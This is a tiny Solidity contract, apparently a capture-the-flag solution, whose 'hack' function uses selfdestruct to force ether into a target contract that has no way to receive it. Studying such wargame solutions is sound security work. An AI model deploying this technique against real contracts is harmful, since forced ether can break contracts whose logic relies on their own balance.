// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackForce {
    
    function hack(address payable _force) public {
        selfdestruct(_force);
    }

    function deposit() public payable {}
}